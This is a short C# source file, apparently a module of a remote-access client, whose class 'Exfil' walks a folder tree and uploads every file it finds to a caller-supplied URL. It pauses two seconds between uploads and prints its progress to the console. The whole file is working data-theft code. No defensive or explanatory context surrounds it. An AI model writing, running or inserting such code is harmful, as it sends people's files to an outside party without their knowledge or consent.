using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    public class Exfil
    {
        public async Task UploadFilesRecursively(string folderPath, string url)
        {
            HttpClient httpClient = new HttpClient();
            // Get all files recursively in the folder
            try
            {
                string[] files = Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories);

                foreach (string filePath in files)
                {
                    await Task.Delay(2000);
                    Console.WriteLine($"Uploading: {filePath}");
                    using (MultipartFormDataContent content = new MultipartFormDataContent())
                    {
                        byte[] fileData = File.ReadAllBytes(filePath);
                        ByteArrayContent fileContent = new ByteArrayContent(fileData);

                        // Add the file to the content
                        content.Add(fileContent, "file", Path.GetFileName(filePath));

                        // Send POST request
                        HttpResponseMessage response = await httpClient.PostAsync(url, content);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine($"Uploaded: {filePath}");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to upload: {filePath}");
                            Console.WriteLine($"Status code: {response.StatusCode}");
                            Console.WriteLine(await response.Content.ReadAsStringAsync());
                        }
                    }
                }
                Console.WriteLine("All files uploaded successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }
    }
}
